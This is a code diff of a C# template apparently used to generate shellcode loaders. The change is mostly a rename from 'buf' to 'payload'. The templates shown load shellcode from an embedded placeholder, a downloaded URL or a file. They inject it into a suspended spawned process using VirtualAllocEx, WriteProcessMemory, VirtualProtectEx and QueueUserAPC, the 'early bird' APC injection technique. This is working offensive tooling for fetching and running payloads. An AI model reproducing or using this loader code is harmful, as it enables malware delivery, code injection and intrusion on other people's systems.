@@ -2,10 +2,10 @@
 {
     class EB_QUAPC
     {
-
         public static string STATICMODE = @"
-            System.Collections.Generic.List<byte> bufList = new System.Collections.Generic.List<byte> { {{SHELLCODE}} };
-            byte[] buf = bufList.ToArray();
+            System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
+            {{SHELLCODE}}
+            byte[] payload = payloadList.ToArray();
             ";
 
         public static string DOWNLOADMODE = @"
@@ -16,10 +16,10 @@
 
             ArgValues parsedArgs = ArgParse(args);
             System.Net.WebClient wc = new System.Net.WebClient();
-            byte[] buf;
-            buf = wc.DownloadData(parsedArgs.DownloadURI);
+            byte[] payload;
+            payload = wc.DownloadData(parsedArgs.DownloadURI);
             
-            if (buf.Length == 0)
+            if (payload.Length == 0)
             {
                 Console.WriteLine(""[!] Error downloading"");
             }
@@ -32,7 +32,7 @@
             }
 
             ArgValues parsedArgs = ArgParse(args);
-            byte[] buf = System.IO.File.ReadAllBytes(parsedArgs.binPath);
+            byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);
 ";
         public static string DYNAMICARGPARSE = @"
         public class ArgValues
@@ -262,7 +262,7 @@ namespace {{NAMESPACE}}
 
             if (CreateProcess( {{SPAWN}}, null, ref processSec, ref threadSec, false, 0x00000004, IntPtr.Zero, null, ref sInfo, out procInfo)) //0x00000004 == CreateSuspended
             {
-                IntPtr baseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, buf.Length, AllocationType.Commit, MemoryProtection.ReadWrite);
+                IntPtr baseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, payload.Length, AllocationType.Commit, MemoryProtection.ReadWrite);
                 if (baseAddress == null)
                 {
                     Console.WriteLine(""[!] VirtualAllocEx: {0}"", Marshal.GetLastWin32Error().ToString());
@@ -270,7 +270,7 @@ namespace {{NAMESPACE}}
                     Environment.Exit(0);
                 }
                 IntPtr BytesWritten;
-                WriteProcessMemory(procInfo.hProcess, baseAddress, buf, buf.Length, out BytesWritten);
+                WriteProcessMemory(procInfo.hProcess, baseAddress, payload, payload.Length, out BytesWritten);
 
                 if (BytesWritten == IntPtr.Zero)
                 {
@@ -287,7 +287,7 @@ namespace {{NAMESPACE}}
                 }
 
                 uint oldProtect;
-                var VPExRet = VirtualProtectEx(procInfo.hProcess, baseAddress, buf.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);
+                var VPExRet = VirtualProtectEx(procInfo.hProcess, baseAddress, payload.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);
 
                 var retValue = QueueUserAPC(baseAddress, hOThread, IntPtr.Zero);
                 if (retValue == IntPtr.Zero)
